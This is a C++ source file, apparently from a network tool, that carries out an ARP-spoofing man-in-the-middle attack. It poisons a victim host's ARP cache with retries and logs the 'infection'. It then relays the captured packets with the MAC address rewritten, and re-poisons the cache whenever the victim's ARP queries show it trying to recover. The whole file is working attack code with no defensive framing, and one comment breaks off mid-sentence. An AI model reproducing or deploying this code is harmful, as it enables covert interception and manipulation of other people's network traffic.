#include "pch.h"
#include "net/netflow.h"
#include "pstl/waithandle.h"

std::future<bool> NetworkFlow::InitializeComponents()
{
	return std::async(std::launch::async, [this]()
	{
		auto ts = _sender.InitializeComponentsAsync();
		auto tt = _target.InitializeComponentsAsync();
		return ts.get() && tt.get();
	});
}

std::future<bool> NetworkFlow::Run()
{
	return std::async(std::launch::async, [this]()
	{
		auto targetIP = _target.IP.Get();
		auto selfMAC = MAC::Self();
		if (!selfMAC)
		{
			LOG(FAIL) << "could not retrieve MAC self";
			return false;
		}

		bool affect;
		int attempt = 0;
		do
		{
			LOG(INFO) << "attempt to spoof ARP table of "
					  << static_cast<std::string_view>(_sender.IP.Get())
					  << " [" << attempt << "/5]";
			_sender.InfectAsync(_target.IP.Get()).wait();
			LOG(VERB) << "testing whether ARP modified";
			affect = _sender.InfectionTestAsync(targetIP, _timeout).get();
			if (affect)
			{
				LOG(NOTE) << "ARP table for "
						  << static_cast<std::string_view>(_sender.IP.Get())
						  << "has been infected";
			}
			else
			{
				LOG(WARN) << "failed to attempt spoof ARP table of "
						  << static_cast<std::string_view>(_sender.IP.Get());
			}
		} while (!affect && attempt++ < 5);

		if (!affect)
		{
			LOG(FAIL) << "could not spoof ARP table of "
					  << static_cast<std::string_view>(_sender.IP.Get());
			return false;
		}

		return true;
	});
}

std::future<bool> NetworkFlow::Relay()
{
	return std::async(std::launch::async, [this]()
	{
		auto selfMAC = MAC::Self();
		if (!selfMAC)
		{
			LOG(FAIL) << "could not retrieve MAC self";
			return false;
		}

		NetworkObject::HandlerType relayer([selfMAC, this](const HeaderSet& hdr, const OctetStream& origin)
		{
			/*
			 * do NOT use as reference
			 * stream can be used at different handler
			 * (stream is unique object. if you )
			 */
			OctetStream data;
			data += origin;

			auto rawMAC = selfMAC.value().Raw.Get();
			_rt_memcpy(data.As<DTO(MAC)>(sizeof(DTO(MAC))), &rawMAC, sizeof(DTO(MAC)));

			_target.Send(std::move(data));

			/*
			 * Target --)        : Who has this IP?
			 * Target --> Sender : Do you have this IP/MAC?
			 * */
			if (hdr.GetType() == HeaderSet::SpecialType::ARP &&
				(hdr.GetARP().TargetIP.Get() == _target.IP.Get() ||
				 hdr.GetARP().TargetMAC.Get() == _target.MAC.Get()))
			{
				/* Sender attempt to recover ARP table => re-infect */
				_sender.InfectAsync(_target.IP.Get());
			}
		});
		_sender += relayer;

		return true;
	});
}

std::future<bool> NetworkFlow::Periodic(std::chrono::milliseconds period)
{
	return std::async(std::launch::async, [this, period]()
	{
		_sender.InfectAsync(_target.IP.Get()).wait();

		auto stp = std::chrono::system_clock::now();
		for (;;)
		{
			auto etp = std::chrono::system_clock::now();
			if (std::chrono::duration_cast<std::chrono::milliseconds>(etp - stp) > period)
				break;
			sched_yield();
		}

		return true;
	});
}
